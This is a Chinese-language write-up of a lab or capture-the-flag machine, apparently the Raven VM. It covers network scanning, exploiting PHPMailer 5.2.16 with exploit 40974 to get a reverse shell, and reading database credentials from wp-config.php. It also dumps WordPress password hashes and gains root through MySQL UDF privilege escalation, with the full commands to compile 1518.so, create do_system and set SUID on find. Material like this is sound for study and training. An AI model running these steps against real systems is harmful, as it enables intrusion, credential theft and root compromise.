# 信息收集

### 1.IP探测

    
    
    arp-scan -l

![1667614673_6365c7d1d94f97dccd61f.png!small?1667614673892](https://image.3001.net/images/20221105/1667614673_6365c7d1d94f97dccd61f.png!small?1667614673892)

### 2.端口探测

    
    
    nmap -T4 -A -p- -v 192.168.1.120

![1667614688_6365c7e03955232211dba.png!small?1667614688311](https://image.3001.net/images/20221105/1667614688_6365c7e03955232211dba.png!small?1667614688311)

![1667614701_6365c7edb13aa28a5d207.png!small?1667614701694](https://image.3001.net/images/20221105/1667614701_6365c7edb13aa28a5d207.png!small?1667614701694)

### 3.访问80端口，查看CMS

![1667614715_6365c7fb6c927e152b102.png!small?1667614715531](https://image.3001.net/images/20221105/1667614715_6365c7fb6c927e152b102.png!small?1667614715531)

cms

![1667614725_6365c805580fcf534b74f.png!small?1667614725323](https://image.3001.net/images/20221105/1667614725_6365c805580fcf534b74f.png!small?1667614725323)

### 4.目录扫描

    
    
    dirsearch -u http://192.168.1.120 -i 200 301 -r -R 3

![1667614743_6365c817159e85e079382.png!small?1667614743253](https://image.3001.net/images/20221105/1667614743_6365c817159e85e079382.png!small?1667614743253)

![1667614757_6365c8254d8db6eb8c6cc.png!small?1667614757442](https://image.3001.net/images/20221105/1667614757_6365c8254d8db6eb8c6cc.png!small?1667614757442)

## 渗透过程

### 1.查看文件/vendor/PATH发现flag1

![1667614768_6365c83087c5f4388101d.png!small?1667614768442](https://image.3001.net/images/20221105/1667614768_6365c83087c5f4388101d.png!small?1667614768442)

### 2.查看文件夹

/vendor/SECURITY.md文件

![1667614779_6365c83b4be4f7f44c496.png!small?1667614779322](https://image.3001.net/images/20221105/1667614779_6365c83b4be4f7f44c496.png!small?1667614779322)

/vendor/VERSION

![1667614788_6365c844ccd0c5b05b433.png!small?1667614788720](https://image.3001.net/images/20221105/1667614788_6365c844ccd0c5b05b433.png!small?1667614788720)

    
    
    PHPMailer 5.2.16

### 3.观察目录疑似WordPress

没扫描出来

![1667614800_6365c850c69a18eb0d59c.png!small?1667614800754](https://image.3001.net/images/20221105/1667614800_6365c850c69a18eb0d59c.png!small?1667614800754)

### 4.搜索PHPMailer

![1667614812_6365c85c2547b0615e99a.png!small?1667614812117](https://image.3001.net/images/20221105/1667614812_6365c85c2547b0615e99a.png!small?1667614812117)

我使用的是40974.py生成反弹shell,访问shell文件，nc连接。

    
    
    下载40974.py利用命令  
    searchsploit -p 40974.py获取40974.py地址  
    searchsploit -m 40974.py复制到当前目录

### 5.修改40974.py

![1667614877_6365c89d7cb52479b4b18.png!small?1667614877526](https://image.3001.net/images/20221105/1667614877_6365c89d7cb52479b4b18.png!small?1667614877526)

执行脚本，访问contact.php页面触发生成bb.php，然后访问bb.php,kali监听。

![1667614888_6365c8a896917277eb90d.png!small?1667614888527](https://image.3001.net/images/20221105/1667614888_6365c8a896917277eb90d.png!small?1667614888527)

### 6.find查找flag

    
    
    find / -iname "*flag*"  // /从/目录开始找  -i 不区分大小写  

![1667614899_6365c8b3bb9cc671a7330.png!small?1667614899759](https://image.3001.net/images/20221105/1667614899_6365c8b3bb9cc671a7330.png!small?1667614899759)

    
    
    /var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png  
    /var/www/flag2.txt

![1667614911_6365c8bf0a5ffdef90b65.png!small?1667614910891](https://image.3001.net/images/20221105/1667614911_6365c8bf0a5ffdef90b65.png!small?1667614910891)

![1667614923_6365c8cbafe77c5693ab6.png!small?1667614923780](https://image.3001.net/images/20221105/1667614923_6365c8cbafe77c5693ab6.png!small?1667614923780)

# 提权

### 1.查看sudi提权命令

    
    
    find / -perm -u=s -type f 2>/dev/null   //没啥可以利用的命令

![1667614943_6365c8df91f1c456f90aa.png!small?1667614943567](https://image.3001.net/images/20221105/1667614943_6365c8df91f1c456f90aa.png!small?1667614943567)

### 2.查看系统版本

没发现版本漏洞

![1667614957_6365c8ed97f2073fc7937.png!small?1667614957602](https://image.3001.net/images/20221105/1667614957_6365c8ed97f2073fc7937.png!small?1667614957602)

### 3.查看wordpress配置文件

    
    
    /var/www/html/wordpress/wp-config.php  
    'DB_USER', 'root'  
    'DB_PASSWORD', 'R@v3nSecurity'

![1667614971_6365c8fb1187bf4cc48aa.png!small?1667614971039](https://image.3001.net/images/20221105/1667614971_6365c8fb1187bf4cc48aa.png!small?1667614971039)

### 4.连接数据库

![1667614996_6365c914785653f1fcf08.png!small?1667614996425](https://image.3001.net/images/20221105/1667614996_6365c914785653f1fcf08.png!small?1667614996425)

    
    
    michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0   
    ​  
    steven     | $P$B6X3H3ykawf2oHuPsbjQiih5iJXqad.  
    ​  
    5.5.60-0+deb8u1 

![1667615008_6365c92010763006b28be.png!small?1667615008119](https://image.3001.net/images/20221105/1667615008_6365c92010763006b28be.png!small?1667615008119)

查看MySQL进程

    
    
    ps -ef|grep mysql  

![1667615021_6365c92d8ffed427657c0.png!small?1667615021564](https://image.3001.net/images/20221105/1667615021_6365c92d8ffed427657c0.png!small?1667615021564)

查看漏洞库：

    
    
    searchsploit mysql  

![1667615032_6365c9381434a2ba8a937.png!small?1667615032053](https://image.3001.net/images/20221105/1667615032_6365c9381434a2ba8a937.png!small?1667615032053)

编译语句1518.c里面有

    
    
    chmod 777 1518.c  
    gcc -g -c 1518.c   
    gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc

![1667615044_6365c944919c87a7c6ff2.png!small?1667615044636](https://image.3001.net/images/20221105/1667615044_6365c944919c87a7c6ff2.png!small?1667615044636)

kali1518.so放在/var/www/html目录下，再从kali下载1518.so

![1667615055_6365c94f4df0f62d555b7.png!small?1667615055286](https://image.3001.net/images/20221105/1667615055_6365c94f4df0f62d555b7.png!small?1667615055286)

udp添加find函数

进入数据库mysql;

    
    
    use mysql;

创建数据表

    
    
    create table aa(line blob);

向aa表中插入数据

    
    
    insert into aa values(load_file('/tmp/1518.so'));//exp位置

aa表成功插入二进制数据，然后利用dumpfile函数将文件导出

    
    
    select * from aa into dumpfile '/usr/lib/mysql/plugin/1518.so';

创建自定义函数do_system类型integer，别名soname文件名字然后查询函数是否创建成功。

    
    
    create function do_system returns integer soname '1518.so';  
    ​  
    select * from mysql.func;

调用do_system函数来给find命令所有者的suid权限，使其可以执行root命令

    
    
    select do_system('chmod u+s /usr/bin/find');

### find提权

![1667615070_6365c95e558b653308005.png!small?1667615070541](https://image.3001.net/images/20221105/1667615070_6365c95e558b653308005.png!small?1667615070541)

![1667615089_6365c97107d26a1a48c6c.png!small?1667615088991](https://image.3001.net/images/20221105/1667615089_6365c97107d26a1a48c6c.png!small?1667615088991)

### flag4

![1667615099_6365c97b0afe5cd62d72a.png!small?1667615099244](https://image.3001.net/images/20221105/1667615099_6365c97b0afe5cd62d72a.png!small?1667615099244)

# 总结

  * 目录扫描扫不出什么时，尝试递归扫描

  * wp搭建的善于寻找插件版本漏洞，多看wp学会掌握不同exp的利用方式

  * 内核版本，suid没发现信息时，要记得数据库，毕竟那里没有数据库是吧。

  * 配置文件往往有可利用信息。

  * 查看进程 ps -ef | grep mysql

  

  

